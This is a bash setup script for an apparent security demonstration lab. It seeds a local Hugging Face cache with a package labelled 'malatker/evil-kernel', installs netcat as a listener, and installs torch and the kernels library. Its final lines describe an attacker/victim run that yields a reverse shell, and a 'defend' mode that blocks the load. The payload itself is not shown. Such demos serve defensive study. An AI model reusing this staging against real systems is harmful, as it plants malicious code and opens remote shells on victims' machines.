#!/usr/bin/env bash
# One-time setup. Seeds the offline kernel cache FIRST (instant, no network),
# then ensures deps are present. No Docker, no Hugging Face Hub at runtime.
#
# The bundled kernel ships a `torch-universal` build variant, so ANY CUDA build
# of torch works (the `kernels` library always falls back to torch-universal).
# That's why we install plain `torch` here instead of pinning torch==2.5.1+cu121.
set -uo pipefail
REPO="$(cd "$(dirname "$0")" && pwd)"
export HF_HOME="$REPO/.hfcache"
HUB="$HF_HOME/hub"
REV="0000000000000000000000000000000000000001"

echo "[1/4] Seeding offline cache for the malicious kernel at $HUB"
d="$HUB/models--malatker--evil-kernel"; s="$d/snapshots/$REV"
rm -rf "$d"; mkdir -p "$s" "$d/refs"
cp -r "$REPO/payload/evil-kernel/." "$s/"
echo -n "$REV" > "$d/refs/main"
echo "    seeded malatker/evil-kernel (variants: $(ls "$REPO/payload/evil-kernel/build" | tr '\n' ' '))"

echo "[2/4] Ensuring netcat is available (listener); ignored if apt is unavailable"
if ! command -v nc >/dev/null 2>&1; then
  (apt-get update -qq && apt-get install -y -qq netcat-openbsd) 2>/dev/null \
    || echo "    (skip) no nc and apt unavailable — attacker.sh will use its Python listener"
fi

echo "[3/4] Ensuring Python deps (torch [CUDA build], transformers 5.2.0, kernels)"
if python3 -c "import torch,transformers,kernels" 2>/dev/null; then
  echo "    already installed — skipping pip"
else
  PF=""   # auto-add --break-system-packages on PEP-668 managed interpreters
  python3 -c "import os,sysconfig,sys; sys.exit(0 if os.path.exists(os.path.join(sysconfig.get_path('stdlib'),'EXTERNALLY-MANAGED')) else 1)" && PF="--break-system-packages"
  # Default PyPI torch on Linux is a CUDA build (torch.version.cuda set) and has
  # wheels for every supported Python — so build deps resolve and no source build.
  pip install -q $PF torch \
    || { echo "    !! torch install failed — check networking, then re-run"; exit 1; }
  pip install -q $PF "transformers==5.2.0" "kernels==0.10.5" "huggingface_hub" \
    || { echo "    !! deps install failed"; exit 1; }
fi

echo "[4/4] Verifying the environment can load the bundled kernel"
python3 - <<'PY'
import torch
assert torch.version.cuda is not None, (
    "torch is a CPU-only build (torch.version.cuda is None); the kernels library "
    "needs a CUDA build. Run: pip install torch  (the default Linux wheel is CUDA).")
from kernels.utils import build_variants
print(f"    torch {torch.__version__}  cuda {torch.version.cuda}")
print(f"    kernels will look for variants: {build_variants()}")
print("    bundled kernel provides 'torch-universal' -> always matches")
PY
# make sure the universal variant is actually present on disk
test -f "$REPO/payload/evil-kernel/build/torch-universal/evil_kernel/__init__.py" \
  && echo "    OK — torch-universal variant present" \
  || { echo "    !! torch-universal variant missing from payload/evil-kernel"; exit 1; }

echo
echo "[+] Setup complete. In two terminals:"
echo "      Terminal 1:  bash attacker.sh"
echo "      Terminal 2:  bash victim.sh         # attack (reverse shell)"
echo "                   bash victim.sh defend  # defended (load blocked)"
